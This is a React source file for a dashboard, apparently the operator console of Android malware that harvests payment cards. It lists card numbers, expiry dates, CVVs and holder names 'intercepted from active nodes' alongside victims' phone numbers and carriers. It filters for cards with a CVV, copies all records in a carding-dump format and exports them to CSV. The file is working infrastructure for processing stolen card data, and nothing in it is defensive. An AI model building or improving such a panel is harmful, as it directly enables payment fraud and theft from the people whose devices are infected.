import { useEffect, useMemo, useState } from "react";
import { Layout } from "@/components/layout";
import { getScraped, type ScrapedCard, type ScrapedDevice } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import {
  CreditCard,
  Smartphone,
  Search,
  Copy,
  CheckCircle2,
  Eye,
  EyeOff,
  Filter,
  Download,
  Calendar,
  KeyRound,
  Shield,
  X,
  Radio,
  RefreshCw,
} from "lucide-react";
import { Link } from "wouter";

// Helper to identify card network brand
function getCardBrand(num: string): "visa" | "mastercard" | "rupay" | "amex" | "generic" {
  const clean = num.replace(/\D/g, "");
  if (clean.startsWith("4")) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(clean)) return "mastercard";
  if (/^(508|60|65|81|82)/.test(clean)) return "rupay";
  if (/^3[47]/.test(clean)) return "amex";
  return "generic";
}

function getBrandBadge(brand: string) {
  switch (brand) {
    case "visa":
      return (
        <span className="tag text-blue-400 bg-blue-500/15 border border-blue-500/30">
          VISA
        </span>
      );
    case "mastercard":
      return (
        <span className="tag text-amber-400 bg-amber-500/15 border border-amber-500/30">
          MASTERCARD
        </span>
      );
    case "rupay":
      return (
        <span className="tag text-[#00FFCC] bg-[#00FFCC]/15 border border-[#00FFCC]/30">
          RUPAY
        </span>
      );
    case "amex":
      return (
        <span className="tag text-cyan-400 bg-cyan-500/15 border border-cyan-500/30">
          AMEX
        </span>
      );
    default:
      return (
        <span className="tag text-muted-foreground bg-card border border-border">
          PAYMENT_CARD
        </span>
      );
  }
}

export function ScrapedData() {
  const [cards, setCards] = useState<ScrapedCard[]>([]);
  const [devices, setDevices] = useState<ScrapedDevice[]>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<"cards" | "devices">("cards");
  const [search, setSearch] = useState("");
  const [masked, setMasked] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);
  const [brandFilter, setBrandFilter] = useState<string>("all");

  const { data: scrapeData, isSyncing, refetch } = usePolling(getScraped, 3500);

  useEffect(() => {
    if (!scrapeData) return;
    setCards(scrapeData.cards || []);
    setDevices(scrapeData.devices || []);
    setLoading(false);
  }, [scrapeData]);

  const maskNumber = (n: string) => {
    if (!masked) return n;
    if (n.length < 8) return n;
    return "•••• •••• •••• " + n.slice(-4);
  };

  const filteredCards = useMemo(() => {
    let result = cards;
    if (brandFilter !== "all") {
      if (brandFilter === "has-cvv") {
        result = result.filter((c) => c.cvv && c.cvv.trim().length >= 3);
      } else {
        result = result.filter((c) => getCardBrand(c.cardNumber) === brandFilter);
      }
    }
    if (!search) return result;
    const q = search.toLowerCase();
    return result.filter(
      (c) =>
        c.cardNumber.toLowerCase().includes(q) ||
        c.cardholderName.toLowerCase().includes(q) ||
        c.deviceId.toLowerCase().includes(q) ||
        (c.devicePhone && c.devicePhone.toLowerCase().includes(q))
    );
  }, [cards, search, brandFilter]);

  const filteredDevices = useMemo(() => {
    if (!search) return devices;
    const q = search.toLowerCase();
    return devices.filter(
      (d) =>
        d.deviceId.toLowerCase().includes(q) ||
        (d.phone && d.phone.toLowerCase().includes(q)) ||
        (d.model && d.model.toLowerCase().includes(q)) ||
        (d.provider && d.provider.toLowerCase().includes(q))
    );
  }, [devices, search]);

  const stats = useMemo(() => {
    const withCvv = cards.filter((c) => c.cvv && c.cvv.trim().length >= 3).length;
    const visa = cards.filter((c) => getCardBrand(c.cardNumber) === "visa").length;
    const mc = cards.filter((c) => getCardBrand(c.cardNumber) === "mastercard").length;
    const rupay = cards.filter((c) => getCardBrand(c.cardNumber) === "rupay").length;
    return { withCvv, visa, mc, rupay };
  }, [cards]);

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1800);
  };

  const exportCardsCsv = () => {
    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const header = ["Card Number", "Expiry", "CVV", "Cardholder", "Device ID", "Phone", "Carrier", "Date"];
    const rows = filteredCards.map((c) => [
      c.cardNumber,
      c.expiry,
      c.cvv,
      c.cardholderName,
      c.deviceId,
      c.devicePhone || "",
      c.carrier || "",
      c.capturedAt || "",
    ].map(esc).join(","));

    const csvContent = [header.join(","), ...rows].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `card-intelligence-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <Layout>
      <div className="space-y-5">
        {/* Header Row */}
        <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-border">
          <div>
            <div className="meta text-[10px] text-[#FFB800] font-bold mb-1">
              FINANCIAL_TELEMETRY / CAPTURES
            </div>
            <h2 className="font-display text-3xl sm:text-4xl text-foreground font-bold tracking-tight">
              Card_Intelligence
            </h2>
            <p className="text-xs font-mono text-muted-foreground mt-1">
              CREDENTIAL AND PAYMENT CARD TELEMETRY INTERCEPTED FROM ACTIVE NODES
            </p>
          </div>

          <div className="flex items-center gap-2 flex-wrap">
            <button
              onClick={() => refetch()}
              disabled={isSyncing}
              className="action-btn"
              title="Refresh card stream"
            >
              <RefreshCw className={`w-3 h-3 ${isSyncing ? "animate-spin text-[#00FFCC]" : ""}`} />
              <span className="hidden sm:inline">{isSyncing ? "SYNCING..." : "RELOAD"}</span>
            </button>
            <button
              onClick={() => setMasked(!masked)}
              className="action-btn"
              title={masked ? "Show full card numbers" : "Mask card numbers"}
            >
              {masked ? <Eye className="w-3.5 h-3.5" /> : <EyeOff className="w-3.5 h-3.5" />}
              {masked ? "SHOW_FULL" : "MASK_NUMS"}
            </button>
            <button
              onClick={exportCardsCsv}
              className="action-btn"
              title="Export Card Captures to CSV"
            >
              <Download className="w-3.5 h-3.5" />
              EXPORT_CSV
            </button>
            <button
              onClick={() => {
                const dump = cards
                  .map(
                    (c) =>
                      `CARD: ${c.cardNumber} | EXP: ${c.expiry} | CVV: ${c.cvv} | NAME: ${c.cardholderName} | DEV: ${c.devicePhone || c.deviceId}`
                  )
                  .join("\n");
                copyText(dump, "all-cards");
              }}
              className="action-btn primary"
            >
              {copied === "all-cards" ? (
                <>
                  <CheckCircle2 className="w-3.5 h-3.5" /> COPIED_DUMP
                </>
              ) : (
                <>
                  <Copy className="w-3.5 h-3.5" /> COPY_ALL ({cards.length})
                </>
              )}
            </button>
          </div>
        </div>

        {/* Telemetry Stats Bar */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">TOTAL_CARDS</h4>
            <div className="val text-foreground truncate">{cards.length}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">FULL_CVV</h4>
            <div className="val text-[#00FFCC] truncate">{stats.withCvv}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">VISA_NODES</h4>
            <div className="val text-primary truncate">{stats.visa}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">RUPAY_NODES</h4>
            <div className="val text-[#FFB800] truncate">{stats.rupay}</div>
          </div>
        </div>

        {/* Search & Filter Bar */}
        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
          {/* Main Tab Toggle */}
          <div className="flex items-center gap-1 bg-card/60 p-1 rounded border border-border self-start">
            <button
              onClick={() => setTab("cards")}
              className={`px-3 py-1.5 rounded text-xs font-mono tracking-wider font-semibold transition-all ${
                tab === "cards"
                  ? "bg-primary text-primary-foreground font-bold"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              CARDS ({cards.length})
            </button>
            <button
              onClick={() => setTab("devices")}
              className={`px-3 py-1.5 rounded text-xs font-mono tracking-wider font-semibold transition-all ${
                tab === "devices"
                  ? "bg-primary text-primary-foreground font-bold"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              DEVICE_PAYMENTS ({devices.length})
            </button>
          </div>

          {/* Search Box */}
          <div className="relative flex-1 max-w-md">
            <input
              type="text"
              placeholder="SEARCH_BY_CARD_NAME_OR_PHONE..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-card/40 border border-border rounded px-3 py-2 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary transition-all"
            />
            {search && (
              <button
                onClick={() => setSearch("")}
                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
        </div>

        {/* Brand Filter Pills (For Cards Tab) */}
        {tab === "cards" && (
          <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1">
            {[
              ["all", "ALL_NETWORKS"],
              ["has-cvv", "VERIFIED_CVV"],
              ["visa", "VISA"],
              ["mastercard", "MASTERCARD"],
              ["rupay", "RUPAY"],
              ["amex", "AMEX"],
            ].map(([k, label]) => (
              <button
                key={k}
                onClick={() => setBrandFilter(k)}
                className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all ${
                  brandFilter === k
                    ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
                    : "border-border bg-card/40 text-muted-foreground hover:text-foreground hover:border-border/80"
                }`}
              >
                {label}
              </button>
            ))}
          </div>
        )}

        {/* ── Cards View ── */}
        {tab === "cards" && (
          <div>
            {loading ? (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {[1, 2, 3, 4, 5, 6].map((i) => (
                  <div key={i} className="h-44 rounded bg-card/40 border border-border animate-pulse" />
                ))}
              </div>
            ) : filteredCards.length === 0 ? (
              <div className="p-12 text-center border border-dashed border-border rounded bg-card/20">
                <CreditCard className="w-10 h-10 mx-auto mb-2 opacity-30 text-[#FFB800]" />
                <p className="font-mono text-sm font-semibold text-foreground">
                  NO_CARDS_CAPTURED_YET
                </p>
                <p className="meta text-[10px] mt-1 text-muted-foreground">
                  CARDS SUBMITTED ON CONNECTED DEVICES WILL STREAM HERE AUTOMATICALLY
                </p>
              </div>
            ) : (
              <div key={`${tab}-${brandFilter}-${search}`} className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 animate-in slide-in-from-left-4 fade-in duration-300">
                {filteredCards.map((c, idx) => {
                  const brand = getCardBrand(c.cardNumber);
                  const cardKey = `card-${idx}-${c.cardNumber}`;
                  return (
                    <div
                      key={cardKey}
                      className="stat-card p-4 flex flex-col justify-between hover:border-primary/50 transition-all group"
                    >
                      <div>
                        {/* Top Network & Date */}
                        <div className="flex items-center justify-between gap-2 mb-3">
                          {getBrandBadge(brand)}
                          <span className="meta text-[9px] text-muted-foreground">
                            {c.capturedAt || "LIVE_TELEMETRY"}
                          </span>
                        </div>

                        {/* Card Number */}
                        <div className="p-3 rounded bg-background/80 border border-border mb-3 relative group/num">
                          <span className="meta text-[9px] block text-muted-foreground mb-1">
                            CARD_NUMBER
                          </span>
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-mono text-base font-black tracking-wider text-foreground select-all">
                              {maskNumber(c.cardNumber)}
                            </span>
                            <button
                              onClick={() => copyText(c.cardNumber, `num-${idx}`)}
                              className="action-btn text-[10px] py-0.5 px-2"
                              title="Copy Card Number"
                            >
                              {copied === `num-${idx}` ? (
                                <CheckCircle2 className="w-3 h-3 text-[#00FFCC]" />
                              ) : (
                                <Copy className="w-3 h-3" />
                              )}
                            </button>
                          </div>
                        </div>

                        {/* Expiry & CVV */}
                        <div className="grid grid-cols-2 gap-2 mb-3">
                          <div className="p-2.5 rounded bg-background/60 border border-border">
                            <span className="meta text-[9px] block text-muted-foreground mb-0.5">
                              EXPIRY
                            </span>
                            <span className="font-mono text-sm font-bold text-foreground">
                              {c.expiry || "—"}
                            </span>
                          </div>
                          <div className="p-2.5 rounded bg-background/60 border border-border">
                            <span className="meta text-[9px] block text-muted-foreground mb-0.5">
                              CVV_CODE
                            </span>
                            <span className="font-mono text-sm font-bold text-[#FFB800]">
                              {c.cvv || "—"}
                            </span>
                          </div>
                        </div>

                        {/* Cardholder */}
                        {c.cardholderName && (
                          <div className="text-xs font-mono text-muted-foreground mb-2 flex items-center justify-between">
                            <span className="meta text-[9px]">HOLDER</span>
                            <span className="font-bold text-foreground truncate max-w-[170px]">
                              {c.cardholderName}
                            </span>
                          </div>
                        )}
                      </div>

                      {/* Device origin footer */}
                      <div className="pt-3 border-t border-border flex items-center justify-between text-xs">
                        <Link
                          href={`/device/${c.deviceId}`}
                          className="meta text-[10px] text-primary hover:underline flex items-center gap-1"
                        >
                          <Smartphone className="w-3 h-3" />
                          <span className="truncate max-w-[120px]">{c.devicePhone || c.deviceId}</span>
                        </Link>
                        <button
                          onClick={() => {
                            const full = `NUMBER: ${c.cardNumber}\nEXP: ${c.expiry}\nCVV: ${c.cvv}\nNAME: ${c.cardholderName}\nDEV: ${c.devicePhone || c.deviceId}`;
                            copyText(full, cardKey);
                          }}
                          className="action-btn text-[10px] py-1 px-2.5"
                        >
                          {copied === cardKey ? "COPIED" : "COPY_RECORD"}
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        )}

        {/* ── Devices Tab ── */}
        {tab === "devices" && (
          <div key={`${tab}-${search}`} className="space-y-3 animate-in slide-in-from-left-4 fade-in duration-300">
            {filteredDevices.map((d) => (
              <div
                key={d.deviceId}
                className="stat-card p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-4"
              >
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="status-dot online" />
                    <span className="font-sans font-bold text-foreground text-sm">
                      {d.model || "Unknown Android"}
                    </span>
                    <span className="id-badge">{d.deviceId}</span>
                  </div>
                  <div className="font-mono text-xs text-muted-foreground flex items-center gap-3">
                    <span>TEL: {d.phone || "No Phone"}</span>
                    <span>CARRIER: {d.provider || "Unknown"}</span>
                    <span>CAPTURES: {d.cardCount} Cards</span>
                  </div>
                </div>

                <Link href={`/device/${d.deviceId}`}>
                  <button className="action-btn primary py-1.5 px-4">
                    VIEW_TELEMETRY
                  </button>
                </Link>
              </div>
            ))}
          </div>
        )}
      </div>
    </Layout>
  );
}
